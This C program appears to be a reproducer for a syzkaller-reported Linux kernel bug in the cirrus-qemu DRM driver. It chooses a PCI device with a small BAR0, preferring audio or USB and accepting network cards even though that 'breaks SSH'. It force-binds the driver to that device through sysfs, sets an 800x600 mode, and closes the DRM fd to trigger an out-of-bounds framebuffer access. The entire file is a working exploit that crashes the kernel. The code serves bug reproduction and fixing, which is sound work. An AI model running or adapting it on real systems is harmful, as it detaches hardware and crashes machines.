// https://syzkaller.appspot.com/bug?id=5125a31473fe4764fd19a3b055b35607fe41f5db
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <drm/drm.h>
#include <drm/drm_mode.h>
#include <stdint.h>
#include <errno.h>

#define MAX_PATH 512

int read_file(const char *path, char *buf, size_t size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, size - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return n;
}

int write_file_quiet(const char *path, const char *buf) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

int get_device_score(const char *bdf) {
    char path[MAX_PATH];
    char buf[4096];
    
    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/class", bdf);
    if (read_file(path, buf, sizeof(buf)) <= 0) return -1;
    uint32_t class_code = strtol(buf, NULL, 16);
    uint32_t base_class = class_code >> 16;
    
    // Skip Display, Bridge, and Storage controllers
    if (base_class == 0x03) return -1; 
    if (base_class == 0x06) return -1; 
    if (base_class == 0x01) return -1; 
    
    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/resource", bdf);
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    
    unsigned long long start, end, flags;
    unsigned long long bar0_size = 0, bar1_size = 0;
    
    if (fscanf(f, "%llx %llx %llx", &start, &end, &flags) == 3) {
        if (end > start) bar0_size = end - start + 1;
    }
    if (fscanf(f, "%llx %llx %llx", &start, &end, &flags) == 3) {
        if (end > start) bar1_size = end - start + 1;
    }
    fclose(f);
    
    // We need BAR0 > 0 and < 1.9MB (to overflow with 800x600 fb), and BAR1 > 0
    if (bar0_size > 0 && bar0_size < 1900000 && bar1_size > 0) {
        if (base_class == 0x02) return 1; // Network (fallback, breaks SSH but crashes kernel fast enough)
        return 2; // Audio, USB, etc. (preferred)
    }
    return -1;
}

void bind_cirrus(const char *bdf) {
    char path[MAX_PATH];
    char vendor_dev[64];
    char buf[64];

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/vendor", bdf);
    if (read_file(path, buf, sizeof(buf)) < 0) {
        printf("[-] Failed to read vendor\n");
        exit(1);
    }
    uint32_t vendor = strtol(buf, NULL, 16);

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/device", bdf);
    if (read_file(path, buf, sizeof(buf)) < 0) {
        printf("[-] Failed to read device\n");
        exit(1);
    }
    uint32_t device = strtol(buf, NULL, 16);

    snprintf(vendor_dev, sizeof(vendor_dev), "%04x %04x", vendor, device);

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/driver/unbind", bdf);
    write_file_quiet(path, bdf);

    int res = write_file_quiet("/sys/bus/pci/drivers/cirrus-qemu/new_id", vendor_dev);
    if (res < 0) {
        printf("[-] Failed to write to cirrus-qemu/new_id: %s\n", strerror(errno));
    } else {
        printf("[+] Wrote to cirrus-qemu/new_id successful.\n");
    }

    res = write_file_quiet("/sys/bus/pci/drivers/cirrus-qemu/bind", bdf);
    if (res < 0) {
        printf("[-] Failed to write to cirrus-qemu/bind: %s\n", strerror(errno));
    } else {
        printf("[+] Wrote to cirrus-qemu/bind successful.\n");
    }
}

int open_bound_drm(const char *bdf) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/drm", bdf);
    DIR *dir = opendir(path);
    if (!dir) return -1;

    struct dirent *ent;
    int fd = -1;
    while ((ent = readdir(dir)) != NULL) {
        if (strncmp(ent->d_name, "card", 4) == 0) {
            char dev_path[MAX_PATH];
            snprintf(dev_path, sizeof(dev_path), "/dev/dri/%s", ent->d_name);
            fd = open(dev_path, O_RDWR);
            if (fd >= 0) break;
        }
    }
    closedir(dir);
    return fd;
}

int main() {
    DIR *dir = opendir("/sys/bus/pci/devices");
    if (!dir) {
        printf("[-] Failed to opendir /sys/bus/pci/devices: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] opendir /sys/bus/pci/devices successful.\n");

    struct dirent *ent;
    char target_bdf[64] = {0};
    int best_score = -1;

    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        
        int score = get_device_score(ent->d_name);
        if (score > best_score) {
            best_score = score;
            strncpy(target_bdf, ent->d_name, sizeof(target_bdf) - 1);
        }
    }
    closedir(dir);

    if (best_score < 0) {
        printf("[-] No suitable PCI device found\n");
        exit(1);
    }

    printf("[+] Targeting PCI device: %s (score: %d)\n", target_bdf, best_score);
    bind_cirrus(target_bdf);
    
    int fd = -1;
    for (int i = 0; i < 20; i++) {
        fd = open_bound_drm(target_bdf);
        if (fd >= 0) break;
        usleep(100000); // Wait for driver to probe and create DRM node
    }
    
    if (fd < 0) {
        printf("[-] Failed to open DRM device\n");
        exit(1);
    }
    printf("[+] Successfully bound and opened cirrus-qemu DRM on %s\n", target_bdf);

    struct drm_mode_card_res res = {0};
    int ioctl_res = ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &res);
    if (ioctl_res < 0) {
        printf("[-] Failed to ioctl DRM_IOCTL_MODE_GETRESOURCES: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] ioctl DRM_IOCTL_MODE_GETRESOURCES successful.\n");

    if (res.count_crtcs == 0 || res.count_connectors == 0) {
        printf("[-] No CRTCs or connectors\n");
        exit(1);
    }

    uint32_t *crtcs = malloc(res.count_crtcs * sizeof(uint32_t));
    uint32_t *connectors = malloc(res.count_connectors * sizeof(uint32_t));
    if (!crtcs || !connectors) {
        printf("[-] Failed to malloc\n");
        exit(1);
    }

    res.crtc_id_ptr = (uint64_t)crtcs;
    res.connector_id_ptr = (uint64_t)connectors;

    ioctl_res = ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &res);
    if (ioctl_res < 0) {
        printf("[-] Failed to ioctl DRM_IOCTL_MODE_GETRESOURCES (2): %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] ioctl DRM_IOCTL_MODE_GETRESOURCES (2) successful.\n");

    struct drm_mode_create_dumb create = {
        .width = 800,
        .height = 600,
        .bpp = 32,
    };
    ioctl_res = ioctl(fd, DRM_IOCTL_MODE_CREATE_DUMB, &create);
    if (ioctl_res < 0) {
        printf("[-] Failed to ioctl DRM_IOCTL_MODE_CREATE_DUMB: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] ioctl DRM_IOCTL_MODE_CREATE_DUMB successful.\n");

    struct drm_mode_fb_cmd cmd = {
        .width = 800,
        .height = 600,
        .pitch = create.pitch,
        .bpp = 32,
        .depth = 24,
        .handle = create.handle,
    };
    ioctl_res = ioctl(fd, DRM_IOCTL_MODE_ADDFB, &cmd);
    if (ioctl_res < 0) {
        printf("[-] Failed to ioctl DRM_IOCTL_MODE_ADDFB: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] ioctl DRM_IOCTL_MODE_ADDFB successful.\n");

    struct drm_mode_modeinfo custom_mode = {
        .clock = 40000,
        .hdisplay = 800,
        .hsync_start = 840,
        .hsync_end = 968,
        .htotal = 1056,
        .vdisplay = 600,
        .vsync_start = 601,
        .vsync_end = 605,
        .vtotal = 628,
        .vrefresh = 60,
        .flags = 0,
        .type = 32, // DRM_MODE_TYPE_USERDEF
        .name = "800x600",
    };

    struct drm_mode_crtc crtc = {
        .crtc_id = crtcs[0],
        .fb_id = cmd.fb_id,
        .set_connectors_ptr = (uint64_t)&connectors[0],
        .count_connectors = 1,
        .mode = custom_mode,
        .mode_valid = 1,
    };

    ioctl_res = ioctl(fd, DRM_IOCTL_MODE_SETCRTC, &crtc);
    if (ioctl_res < 0) {
        printf("[-] Failed to ioctl DRM_IOCTL_MODE_SETCRTC: %s\n", strerror(errno));
    } else {
        printf("[+] ioctl DRM_IOCTL_MODE_SETCRTC successful.\n");
    }

    printf("[+] Triggering bug...\n");
    
    // Closing the fd triggers drm_release -> drm_lastclose -> drm_fbdev_client_restore
    // which performs a full atomic commit and copies the framebuffer, causing the out-of-bounds access.
    int close_res = close(fd);
    if (close_res < 0) {
        printf("[-] Failed to close: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] close successful.\n");
    
    sleep(2);

    return 0;
}
